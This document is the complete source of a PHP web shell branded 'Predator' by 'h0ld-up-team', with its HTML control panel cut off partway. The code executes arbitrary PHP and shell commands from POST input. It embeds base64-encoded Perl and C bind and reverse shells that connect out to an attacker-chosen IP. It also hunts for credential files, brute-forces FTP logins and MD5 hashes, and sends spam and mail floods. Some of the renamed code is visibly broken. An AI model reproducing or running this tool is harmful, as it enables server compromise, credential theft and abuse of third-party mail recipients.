<?php
echo '[syslog]01
'; $spf7117b = 0; ini_set('session.gc_maxlifetime', 1); session_start(); error_reporting(0); safe_mode(); $sp19dd0c = '9b534ea55d0b82c3a7e80003a84b6865'; $sp83677c = 'a029d0df84eb5549c641e04a9ef389e5'; if ($spf7117b == 1) { if (!isset($spf69472['PHP_AUTH_USER']) || md5($spf69472['PHP_AUTH_USER']) != $sp19dd0c || md5($spf69472['PHP_AUTH_PW']) != $sp83677c) { header('WWW-Authenticate: Basic realm="PanelAccess"'); header('HTTP/1.0 401 Unauthorized'); die('Access Denied'); } } if ($_GET['kill'] == 'yes') { unlink($_SERVER['SCRIPT_FILENAME']); echo '<script>alert(\'Your shell script was succefully deleted!\')</script>'; } function md5_brute($sp6f4994, $sp00e3b1, $sp456129) { ignore_user_abort(1); set_time_limit(0); $spf321ad = fopen($sp456129, 'r'); $spf321ad = fopen($sp00e3b1, 'w'); $sp1eb57e = 0; if (!$sp456129) { return 'Fill \'dictionary_file\' field!'; } if (!$sp00e3b1) { return 'Fill \'log_file\' field!'; } elseif (!strlen($sp6f4994) == 0) { return 'Fill \'md5_hash\' field!'; } else { while (!$sp4d0bca($sp456129)) { $sp83677c = fgets($sp456129); $spcbf5c2 = md5($sp83677c); if ($spcbf5c2 == $sp6f4994) { fputs($sp00e3b1, "{$sp6f4994}:{$sp83677c}\n---"); fclose($sp456129); fclose($sp00e3b1); die; } else { $sp1eb57e = $sp1eb57e + 1; fputs($sp00e3b1, "{$sp1eb57e} passwords was bruted..."); } } fputs($sp00e3b1, "{$sp1eb57e} passwords are failed!"); } fclose($sp456129); fclose($sp00e3b1); } function port_bind($sp2d79fe, $sp83677c, $sp2f5e40) { $spc356c0 = 'IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vYmFzaCAtaSI7DQppZiAoQEFSR1YgPCAxKSB7IGV4aXQoMSk7IH0NCiRMS
VNURU5fUE9SVD0kQVJHVlswXTsNCnVzZSBTb2NrZXQ7DQokcHJvdG9jb2w9Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0Kc29ja2V0KFMsJlBGX0lORVQs
JlNPQ0tfU1RSRUFNLCRwcm90b2NvbCkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVV
TRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJExJU1RFTl9QT1JULElOQUREUl9BTlkpKSB8fCBkaWUgIkNhbnQgb3BlbiBwb3J0XG4iOw0KbG
lzdGVuKFMsMykgfHwgZGllICJDYW50IGxpc3RlbiBwb3J0XG4iOw0Kd2hpbGUoMSkNCnsNCmFjY2VwdChDT05OLFMpOw0KaWYoISgkcGlkPWZvcmspK
Q0Kew0KZGllICJDYW5ub3QgZm9yayIgaWYgKCFkZWZpbmVkICRwaWQpOw0Kb3BlbiBTVERJTiwiPCZDT05OIjsNCm9wZW4gU1RET1VULCI+JkNPTk4i
Ow0Kb3BlbiBTVERFUlIsIj4mQ09OTiI7DQpleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCmNsb3N
lIENPTk47DQpleGl0IDA7DQp9DQp9'; $sp76d016 = 'I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZS
A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW50I
GFyZ2M7DQpjaGFyICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnVmWzMwXTsNCiBzdHJ1Y3Qgc29ja2FkZHJfaW4gcmVt
b3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0KIHJlbW90ZS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyhhdG9
pKGFyZ3ZbMV0pKTsNCiByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7IA0KIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULF
NPQ0tfU1RSRUFNLDApOw0KIGlmKCFzb2NrZmQpIHBlcnJvcigic29ja2V0IGVycm9yIik7DQogYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2FkZHIgK
ikmcmVtb3RlLCAweDEwKTsNCiBsaXN0ZW4oc29ja2ZkLCA1KTsNCiB3aGlsZSgxKQ0KICB7DQogICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7DQog
ICBkdXAyKG5ld2ZkLDApOw0KICAgZHVwMihuZXdmZCwxKTsNCiAgIGR1cDIobmV3ZmQsMik7DQogICB3cml0ZShuZXdmZCwiUGFzc3dvcmQ6IiwxMCk
7DQogICByZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyhhcmd2WzJdLGJ1ZikpDQogICBzeXN0ZW0oImVjaG8gd2VsY2
9tZSB0byByNTcgc2hlbGwgJiYgL2Jpbi9iYXNoIC1pIik7DQogICBlbHNlDQogICBmcHJpbnRmKHN0ZGVyciwiU29ycnkiKTsNCiAgIGNsb3NlKG5ld
2ZkKTsNCiAgfQ0KIH0NCn0NCmludCBjaHBhc3MoY2hhciAqYmFzZSwgY2hhciAqZW50ZXJlZCkgew0KaW50IGk7DQpmb3IoaT0wO2k8c3RybGVuKGVu
dGVyZWQpO2krKykgDQp7DQppZihlbnRlcmVkW2ldID09ICdcbicpDQplbnRlcmVkW2ldID0gJ1wwJzsgDQppZihlbnRlcmVkW2ldID09ICdccicpDQp
lbnRlcmVkW2ldID0gJ1wwJzsNCn0NCmlmICghc3RyY21wKGJhc2UsZW50ZXJlZCkpDQpyZXR1cm4gMDsNCn0='; if ($sp2f5e40 == 'Perl') { fputs($sp6c3e91 = fopen('/tmp/shlbck', 'w'), base64_decode($spc356c0)); fclose($sp6c3e91); ex(which('perl') . ' /tmp/shlbck ' . $sp2d79fe . ' &'); unlink('/tmp/shlbck'); return ex('ps -aux | grep shlbck'); } elseif ($sp2f5e40 == 'C#') { fputs($sp6c3e91 = fopen('/tmp/shlbck.c', 'w'), base64_decode($sp76d016)); fclose($sp6c3e91); ex('gcc shlbck.c -o shlbck'); unlink('shlbck.c'); ex('/tmp/shlbck ' . $sp2d79fe . ' ' . $sp83677c . ' &'); unlink('/tmp/shlbck'); return ex('ps -aux | grep shlbck'); } else { return 'Choose method'; } } function backconnect($sp0bd168, $sp2d79fe, $sp2f5e40) { $spc356c0 = 'IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj
aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR
hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT
sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI
kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi
KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl
OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=='; $sp76d016 = 'I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC
BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb
SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd
KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ
sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC
Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D
QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp
Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ=='; if ($sp2f5e40 == 'Perl') { fputs($sp6c3e91 = fopen('/tmp/shlbck', 'w'), base64_decode($spc356c0)); fclose($sp6c3e91); ex(which('perl') . ' /tmp/shlbck ' . $sp0bd168 . ' ' . $sp2d79fe . ' &'); unlink('/tmp/shlbck'); return ex('netstat -an | grep -i listen'); } elseif ($sp2f5e40 == 'C#') { fputs($sp6c3e91 = fopen('/tmp/shlbck.c', 'w'), base64_decode($sp76d016)); fclose($sp6c3e91); ex('gcc shlbck.c -o shlbck'); unlink('shlbck.c'); ex('/tmp/shlbck ' . $sp0bd168 . ' ' . $sp2d79fe . ' &'); unlink('/tmp/shlbck'); return ex('netstat -an | grep -i listen'); } else { return 'Choose method'; } } if ($_POST['type'] == 11) { download(stripslashes($_POST['value'])); } function download($spba4f18) { $spa3ecf0 = fopen($spba4f18, 'r'); ob_clean(); $spbc6552 = basename($spba4f18); $sp102605 = fread($spa3ecf0, @filesize($spba4f18)); fclose($spa3ecf0); header('Content-type: ' . $spe58a55); header('Content-disposition: attachment; filename="' . $spbc6552 . '";'); echo $sp102605; } function flooder($sp4a6ef4, $sp438846, $spf6268a, $spc4843d, $sp37b7d8, $sp66598e, $sp5c160f) { ignore_user_abort(1); set_time_limit(0); $spf321ad = fopen($sp4a6ef4, 'w'); $sp1eb57e = 0; if (!$sp4a6ef4) { return 'Fill \'log_file\' field!'; } elseif (!$sp438846) { return 'Fill \'Send to\' field!'; } elseif (!$spf6268a) { return 'Fill \'From\' field!'; } elseif (!$spc4843d) { return 'Fill \'Subject\' field!'; } elseif (!$sp37b7d8) { return 'Fill \'Message\' field!'; } elseif (!$sp66598e) { return 'Fill \'Amount\' field!'; } else { while ($sp1eb57e < $sp66598e) { mail("{$sp438846}", "{$spc4843d}", "{$sp37b7d8}", "From: {$spf6268a}"); $sp1eb57e = $sp1eb57e + 1; $spf321ad = fopen($sp4a6ef4, 'w'); fputs($spf321ad, "{$sp1eb57e} flood-letters was sended..."); fclose($spf321ad); } if (strlen($sp5c160f) != 0) { $sp5b5e8f = "Done! {$sp1eb57e} flood-letters was sended!"; $sp956e15 = 'Check'; mail("{$sp5c160f}", "{$sp956e15}", "{$sp5b5e8f}", "From: {$spf6268a}"); $spf321ad = fopen($sp4a6ef4, 'w'); fputs($spf321ad, "Done! {$sp1eb57e} flood-letters was sended!"); } else { $spf321ad = fopen($sp4a6ef4, 'w'); fputs($spf321ad, "Done! {$sp1eb57e} flood-letters was sended!"); } } fclose($spf321ad); } function ftp_brute($spe8f871, $sp6fe342, $sp58296c, $spa9fddf) { ignore_user_abort(1); set_time_limit(0); $spf321ad = fopen($sp6fe342, 'r'); $sp6ec574 = fopen($sp58296c, 'r'); $sp84051f = fopen($spa9fddf, 'a+'); if (!$spe8f871) { return 'Fill \'Host\' field!'; } elseif (!$sp6fe342) { return 'Fill \'ftp_users file\' field!'; } elseif (!$sp58296c) { return 'Fill \'ftp_passwd file\' field!'; } elseif (!$spa9fddf) { return 'Fill \'ftp_log file\' field!'; } elseif (!file_exists($sp6fe342)) { return 'File ' . $sp6fe342 . ' doesn\'t exists!'; } elseif (!file_exists($sp58296c)) { return 'File ' . $sp58296c . ' doesn\'t exists!'; } else { while (!feof($sp6ec574)) { $sp83677c = fgets($sp6ec574); while (!feof($spf321ad)) { $sp877a3d = fgets($spf321ad); $sp156aba = ftp_connect($spe8f871); if (!$sp156aba) { fputs($sp84051f, "Enable connect to {$spe8f871}\n"); die; } else { $spf7117b = ftp_login($sp156aba, $sp877a3d, $sp83677c); if (!$spf7117b) { ftp_quit($sp156aba); } else { fputs($sp84051f, "{$spe8f871}:\n---{$spea63b2}:{$sp83677c}\n---"); ftp_quit($sp156aba); } } } } fputs($sp84051f, 'Done:
'); fclose($sp84051f); } fclose($spf321ad); fclose($sp6ec574); } function spammer($spf6268a, $spc4843d, $sp37b7d8, $sp5c160f, $spcb94ef, $sp4a6ef4) { ignore_user_abort(1); set_time_limit(0); $sp694629 = fopen($spcb94ef . 'r'); $spf321ad = fopen($sp4a6ef4, 'w'); $sp1eb57e = 0; if (!$spf6268a) { return 'Fill \'From\' field!'; } elseif (!$spcb94ef) { return 'Fill \'Emails list\' field!'; } elseif (!$sp4a6ef4) { return 'Fill \'Log File\' field!'; } elseif (!$sp37b7d8) { return 'Fill \'Message\' field!'; } elseif (!$spc4843d) { return 'Fill \'Subject\' field!'; } elseif (!file_exists($spcb94ef)) { return 'File ' . $spcb94ef . ' doesn\'t exists!'; } else { while (!feof($sp694629)) { $sp438846 = fgets($sp694629); mail("{$sp438846}", "{$spc4843d}", "{$sp37b7d8}", "From: {$spf6268a}"); $sp1eb57e = $sp1eb57e + 1; $spf321ad = fopen($sp4a6ef4, 'w'); fputs($spf321ad, "{$sp1eb57e} letters was sended..."); fclose($spf321ad); } if (strlen($sp5c160f) != 0) { $sp5b5e8f = "Done! {$sp1eb57e} letters was sended!"; $sp956e15 = 'Check'; mail("{$sp5c160f}", "{$sp956e15}", "{$sp5b5e8f}", "From: {$spf6268a}"); $spf321ad = fopen($sp4a6ef4, 'w'); fputs($spf321ad, "Done! {$sp1eb57e} letters was sended!\n"); } else { $spf321ad = fopen($sp4a6ef4, 'w'); fputs($spf321ad, "Done! {$sp1eb57e} letters was sended!"); } } fclose($sp694629); fclose($spf321ad); } echo '[syslog]02
'; function alias($spfd8b49) { if ($spfd8b49 == 'find apahce config file') { return ex('find / -type f -name httpd.conf'); } elseif ($spfd8b49 == 'find access_log files') { return ex('find / -type f -name access_log'); } elseif ($spfd8b49 == 'find error_log files') { return ex('find / -type f -name error_log'); } elseif ($spfd8b49 == 'find suid files') { return ex('find / -type f -perm -04000 -ls'); } elseif ($spfd8b49 == 'find suid files in current dir') { return ex('find . -type f -perm -04000 -ls'); } elseif ($spfd8b49 == 'find sgid files') { return ex('find / -type f -perm -02000 -ls'); } elseif ($spfd8b49 == 'find sgid files in current dir') { return ex('find . -type f -perm -02000 -ls'); } elseif ($spfd8b49 == 'find config.inc.php files') { return ex('find / -type f -name config.inc.php'); } elseif ($spfd8b49 == 'find config.inc.php files in current dir') { return ex('find . -type f -name config.inc.php'); } elseif ($spfd8b49 == 'find config* files') { return ex('find / -type f -name "config*"'); } elseif ($spfd8b49 == 'find config* files in current dir') { return ex('find . -type f -name "config*"'); } elseif ($spfd8b49 == 'find all writable files') { return ex('find / -type f -perm -2 -ls'); } elseif ($spfd8b49 == 'find all writable files in current dir') { return ex('find . -type f -perm -2 -ls'); } elseif ($spfd8b49 == 'find all writable directories') { return ex('find / -type d -perm -2 -ls'); } elseif ($spfd8b49 == 'find all writable directories in current dir') { return ex('find . -type d -perm -2 -ls'); } elseif ($spfd8b49 == 'find all writable directories and files') { return ex('find / -perm -2 -ls'); } elseif ($spfd8b49 == 'find all writable directories and files in current dir') { return ex('find . -perm -2 -ls'); } elseif ($spfd8b49 == 'find all service.pwd files') { return ex('find / -type f -name service.pwd'); } elseif ($spfd8b49 == 'find service.pwd files in current dir') { return ex('find . -type f -name service.pwd'); } elseif ($spfd8b49 == 'find all .htpasswd files') { return ex('find / -type f -name .htpasswd'); } elseif ($spfd8b49 == 'find .htpasswd files in current dir') { return ex('find . -type f -name .htpasswd'); } elseif ($spfd8b49 == 'find all .bash_history files') { return ex('find / -type f -name .bash_history'); } elseif ($spfd8b49 == 'find .bash_history files in current dir') { return ex('find . -type f -name .bash_history'); } elseif ($spfd8b49 == 'find all .mysql_history files') { return ex('find / -type f -name .mysql_history'); } elseif ($spfd8b49 == 'find .mysql_history files in current dir') { return ex('find . -type f -name .mysql_history'); } elseif ($spfd8b49 == 'find all .fetchmailrc files') { return ex('find / -type f -name .fetchmailrc'); } elseif ($spfd8b49 == 'find .fetchmailrc files in current dir') { return ex('find . -type f -name .fetchmailrc'); } elseif ($spfd8b49 == 'list file attributes on a Linux second extended file system') { return ex('lsattr -va'); } elseif ($spfd8b49 == 'show opened ports') { return ex('netstat -an | grep -i listen'); } elseif ($spfd8b49 == '---------------------------------------------------------------------------------------------------------') { return ex('ls -la'); } } function testperl() { if (ex('perl -h')) { return '<font size=2 color=green>ON</font>'; } else { return '<font size=2 color=red>OFF</font>'; } } function testlynx() { if (ex('lynx --help')) { return '<font size=2 color=green>ON</font>'; } else { return '<font size=2 color=red>OFF</font>'; } } function view_size($sp92ea66) { if ($sp92ea66 >= 1073741824) { $sp92ea66 = @round($sp92ea66 / 1073741824 * 100) / 100 . ' GB'; } elseif ($sp92ea66 >= 1048576) { $sp92ea66 = @round($sp92ea66 / 1048576 * 100) / 100 . ' MB'; } elseif ($sp92ea66 >= 1024) { $sp92ea66 = @round($sp92ea66 / 1024 * 100) / 100 . ' KB'; } else { $sp92ea66 = $sp92ea66 . ' B'; } return $sp92ea66; } function testfetch() { if (ex('fetch --help')) { return '<font size=2 color=green>ON</font>'; } else { return '<font size=2 color=red>OFF</font>'; } } function testwget() { if (ex('wget --help')) { return '<font size=2 color=green>ON</font>'; } else { return '<font size=2 color=red>OFF</font>'; } } function oracle() { if (function_exists('ocilogon')) { return '<font size=2 color=green>ON</font>'; } else { return '<font size=2 color=red>OFF</font>'; } } function postgresql() { if (function_exists('pg_connect')) { return '<font size=2 color=green>ON</font>'; } else { return '<font size=2 color=red>OFF</font>'; } } function testmssql() { if (function_exists('mssql_connect')) { return '<font size=2 color=green>ON</font>'; } else { return '<font size=2 color=red>OFF</font>'; } } function testcurl() { if (function_exists('curl_version')) { return '<font size=2 color=green>ON</font>'; } else { return '<font size=2 color=red>OFF</font>'; } } function testmysql() { if (function_exists('mysql_connect')) { return '<font size=2 color=green>ON</font>'; } else { return '<font size=2 color=red>OFF</font>'; } } function safe_mode() { if (!$sp347c9a && strpos(ex('echo abch0ld'), 'h0ld') != 3) { $_SESSION['safe_mode'] = 1; return '<font size=2 color=green>ON</font>'; } else { $_SESSION['safe_mode'] = 0; return '<font size=2 color=red>OFF</font>'; } } function ex($spfd8b49) { $sp7a2456 = ''; if (function_exists('true')) { $sp7a2456 = join('
', $sp7a2456); } elseif (function_exists('passthru')) { ob_start(); passthru($spfd8b49); $sp7a2456 = ob_get_contents(); ob_end_clean(); } elseif (function_exists('system')) { ob_start(); system($spfd8b49); $sp7a2456 = ob_get_contents(); ob_end_clean(); } elseif (function_exists('shell_exec')) { $sp7a2456 = shell_exec($spfd8b49); } elseif (is_resource($sp224638 = popen($spfd8b49, 'r'))) { $sp7a2456 = ''; while (!@feof($sp224638)) { $sp7a2456 .= fread($sp224638, 1024); } pclose($sp224638); } return $sp7a2456; } function shell() { if ($_POST['type'] == 1) { eval(stripslashes($_POST['value'])); } elseif ($_POST['type'] == 2) { pwd(); print_r(ex(stripslashes($_POST['value']))); } elseif ($_POST['type'] == 3) { if ($_SESSION['safe_mode'] == 1) { if (($spcd3c39 = safe_ex('ls -la')) != '') { return $spcd3c39; } else { return safe_ex('dir'); } } else { if (($spcd3c39 = ex('ls -la')) != '') { return $spcd3c39; } else { return ex('dir'); } } } elseif ($_POST['type'] == 4) { if (file_exists(stripslashes($_POST['value']))) { if ($sp347c9a != 1) { echo htmlspecialchars(fread(fopen(stripslashes($_POST['value']), 'rw'), filesize(stripslashes($_POST['value'])))); } else { echo htmlspecialchars(safe_read(stripslashes($_POST['value']))); } $_SESSION['edit'] = 1; $_SESSION['filename'] = $_POST['value']; } else { return 'File doesn\'t exists!'; } } elseif ($_POST['type'] == 5) { fputs(fopen($_SESSION['filename'], 'w'), stripslashes($_POST['value'])); } elseif ($_POST['type'] == 6) { $spe338c5 = pwd(); if (!($sp19dd0c = $_POST['newname'])) { $sp19dd0c = $_FILES['userfile']['name']; } move_uploaded_file($_FILES['userfile']['tmp_name'], $spe338c5 . $sp19dd0c); } elseif ($_POST['type'] == 7) { echo alias($_POST['value']); } elseif ($_POST['type'] == 8) { echo spammer(stripslashes($_POST['from']), stripslashes($_POST['subject']), stripslashes($_POST['msg']), stripslashes($_POST['check']), stripslashes($_POST['elist']), stripslashes($_POST['logf'])); } elseif ($_POST['type'] == 9) { echo ftp_brute(stripslashes($_POST['host']), stripslashes($_POST['users']), stripslashes($_POST['passwd']), stripslashes($_POST['log'])); } elseif ($_POST['type'] == 10) { echo flooder(stripslashes($_POST['log']), stripslashes($_POST['to']), stripslashes($_POST['from']), stripslashes($_POST['subject']), stripslashes($_POST['msg']), stripslashes($_POST['amount']), stripslashes($_POST['check'])); } elseif ($_POST['type'] == 12) { echo backconnect(stripslashes($_POST['ip']), stripslashes($_POST['port']), stripslashes($_POST['method'])); } elseif ($_POST['type'] == 13) { echo backconnect(stripslashes($_POST['port']), stripslashes($_POST['pass']), stripslashes($_POST['method'])); } elseif ($_POST['type'] == 14) { echo md5_brute(stripslashes($_POST['hash']), stripslashes($_POST['log']), stripslashes($_POST['dict'])); } else { $spcd3c39 = ex('ls -la'); if ($spcd3c39 == '') { return ex('dir'); } else { return $spcd3c39; } } return null; } function edit() { if ($_SESSION['edit'] == 1) { $_SESSION['edit'] = 0; return '<br><center><input type=submit style="border:1px solid #666666;background:#333333;font-weight:bold;" value="Save"></center>'; } } function getsystem() { return 'true'; } function getserver() { return getenv('SERVER_SOFTWARE'); } function getuser() { $sp7a2456 = 'true'; if ($sp7a2456 != 'SYSTEM') { if (($sp7a2456 = ex('id')) == '') { $sp7a2456 = 'uid=vvvv (sss) gid=' . getmygid(); } } return $sp7a2456; } function pwd() { if ($_POST['type'] == 3) { $_SESSION['pwd'] = stripslashes($_POST['value']); } chdir($_SESSION['pwd']); $spe7342d = getcwd(); if ($spcd3c39 = strrpos($spe7342d, '/')) { if ($spcd3c39 != strlen($spe7342d) - 1) { return $spe7342d . '/'; } else { return $spe7342d; } } elseif ($spcd3c39 = strrpos($spe7342d, '\\')) { if ($spcd3c39 != strlen($spe7342d) - 1) { return $spe7342d . '\\'; } else { return $spe7342d; } } } function safe_ex($spfd8b49) { if ($spfd8b49) { $sp6bf0a4 = dir('.'); while (false !== ($spa3ecf0 = $sp6bf0a4->read())) { if ($spa3ecf0 == '.' || $spa3ecf0 == '..') { continue; } @clearstatcache(); list($spd8afbb, $spec8c51, $sp59bd00, $sp67c605, $spca6b76, $spba592d, $sp35b5a9, $sp92ea66, $spb2bf9f, $sp18e70c, $sp8ea8cb, $sp53695d) = stat($spa3ecf0); if (!$spcc2cff) { echo date('d.m.Y	 H:i', $sp18e70c) . '	'; if (@is_dir($spa3ecf0)) { echo '  <DIR> '; } else { printf('% 7s ', $sp92ea66); } } else { $sp0581a1 = @posix_getpwuid($spca6b76); $sp7b2526 = @posix_getgrgid($spba592d); echo $spec8c51 . ' '; echo perms(@fileperms($spa3ecf0)); printf('% 4d % 9s % 9s %7s ', $sp67c605, $sp0581a1['name'], $sp7b2526['name'], $sp92ea66); echo date('d.m.Y H:i ', $sp18e70c); } echo "{$spa3ecf0}\n"; } $sp6bf0a4->close(); } function safe_read($spfd8b49) { echo ini_get('safe_mode'); echo ini_get('open_basedir'); include '/etc/passwd'; ini_restore('safe_mode'); ini_restore('open_basedir'); echo ini_get('safe_mode'); echo ini_get('open_basedir'); file_get_contents($spfd8b49); } } ?>










<html>
<head>
<title>.::Predator::.</title>
<META http-equiv="Content-Type" content="text/html; charset=CP866">
<style type=text/css>
.ta {background: #333333; border:1px solid #666666; color: #FFFFFF;}
.bt {border: 1px solid #666666;background: #333333;font-weight:bold;}
.td1 {border:2px solid #000000;}
.td2 {border:1px solid #000000;}
.ram {border:1px solid #666666;background:#222222;}
body { scrollbar-base-color: #333333}
</style>
<script>
function kill()
{
var y;
y = confirm('Are you really want to kill shell?');
if(y == true)
{
document.location = '?kill=yes';
}
}
</script>
</head>
<body bgcolor='#000000'>
<center><table width=90% cellpadding=0 cellspacing=0 style="border: 1px solid #666666">
<tr><td width=100% height=70 bgcolor='#333333' style="border-bottom: 2px solid #666666" valign=top>
<table valign=top>
<tr><td valign=top>
<table valign=center class='ram'>
<tr><td width=5% align=right>
<font size=2 color=#888888>System:</font>
</td>
<td width=100%>
<font size=2 color=red><b><?php  echo getsystem(); ?>
</b></font>
</td></tr>
<tr><td width=5% align=right>
<font size=2 color=#888888>Server:</font>
</td>
<td width=100%>
<font size=2 color=red><b><?php  echo getserver(); ?>
</b></font>
</td></tr>
<tr><td width=5% align=right>
<font size=2 color=#888888>User:</font>
</td>
<td width=100%>
<font size=2 color=red><b><?php  echo getuser(); ?>
</b></font>
</td></tr>
<tr><td width=5% align=right>
<font size=2 color=#888888>pwd:</font>
</td>
<td width=100%>
<font size=2 color=red><b><?php  if (strlen($spcd3c39 = pwd()) > 45) { echo '...' . substr($spcd3c39, strlen($spcd3c39) - 40, 40); } else { echo $spcd3c39; } ?>
</b></font>
</td></tr>
</table>
</td>
<td width=13% valign=center align=center>
<table width=100% height=100% cellpadding=0 cellspacing=0><tr><td width=100% height=100%>
<center>
<a href="http://h0ld-up.info"><table cellpadding=2 cellspacing=2 style="border:1px solid #666666;background:#444444">
<tr><td><font size=2 color=#999999>
<center><b>.::h0ld-up-team::.<br>web-shell</b></center>
</font></td></tr></table></a></center>
</td></tr><tr><td height=5></td></tr><tr><td>
<center>

<input type=submit style="border:1px solid #666666;background: darkred;font-weight:bold;" value='   Kill Shell   ' onclick='kill()'>

</center>
</td></tr></table>

</td>
<td class='ram' width=45% valign=center align=center>
<table  cellpadding=0 cellspacing=0>
<tr><td>
<table valign=top cellpadding=0 cellspacing=0>
<tr><td align=right>
<font size=2 color='#888888'>PHP-version:</font>
</td></tr>
<tr><td align=right>
<font size=2 color='#888888'>MySQL:</font>
</td></tr>
<tr><td align=right>
<font size=2 color='#888888'>MSSQL:</font>
</td></tr>
<tr><td align=right>
<font size=2 color='#888888'>PostgreSQL:</font>
</td></tr>
<tr><td align=right>
<font size=2 color='#888888'>Oracle:</font>
</td></tr>
</table>
</td><td>
<table valign=top  cellpadding=0 cellspacing=0>
<tr><td>
<b><font size=2 color=red><?php  echo phpversion(); ?>
</font></b>
</td></tr>
<tr><td>
<b><?php  echo testmysql(); ?>
</b>
</td></tr>
<tr><td>
<b><?php  echo testmssql(); ?>
</b>
</td></tr>
<tr><td>
<b><?php  echo postgresql(); ?>
</b>
</td></tr>
<tr><td>
<b><?php  echo oracle(); ?>
</b>
</td></tr>
</table>
</td><td width=4%></td>
<td valign=top><table cellpadding=0 cellspacing=0 valign=top>
<tr><td valign=top align=right>
<font color=#888888 size=2>Safe_mode:</font>
</td></tr>
<tr><td valign=top align=right>
<font color=#888888 size=2>cURL:</font>
</td></tr>
<tr><td valign=top align=right>
<font color=#888888 size=2>wget:</font>
</td></tr>
<tr><td valign=top align=right>
<font color=#888888 size=2>fetch:</font>
</td></tr>
<tr><td valign=top align=right>
<font color=#888888 size=2>lynx:</font>
</td></tr>
</table></td>
<td valign=top><table cellpadding=0 cellspacing=0 valign=top>
<tr><td valign=top>
<b><?php  echo safe_mode(); ?>
</b>
</td></tr>
<tr><td valign=top>
<b><?php  echo testcurl(); ?>
</b>
</td></tr>
<tr><td valign=top>
<b><?php  echo testwget(); ?>
</b>
</td></tr>
<tr><td valign=top>
<b><?php  echo testfetch(); ?>
</b>
</td></tr>
<tr><td valign=top>
<b><?php  echo testlynx(); ?>
</b>
</td></tr>
</table></td>
<td width=4%></td>
<td valign=top><table cellpadding=0 cellspacing=0 valign=top>
<tr><td valign=top align=right>
<font color=#888888 size=2>Perl:</font>
</td></tr>
<tr><td valign=top align=right>
<font color=#888888 size=2>Server time:</font>
</td></tr>
<tr><td valign=top align=right>
<font color=#888888 size=2>Server date:</font>
</td></tr>
<tr><td valign=top align=right>
<font color=#888888 size=2>Total space:</font>
</td></tr>
<tr><td valign=top align=right>
<font color=#888888 size=2>Free space:</font>
</td></tr>
</table></td>
<td valign=top><table cellpadding=0 cellspacing=0 valign=top>
<tr><td valign=top>
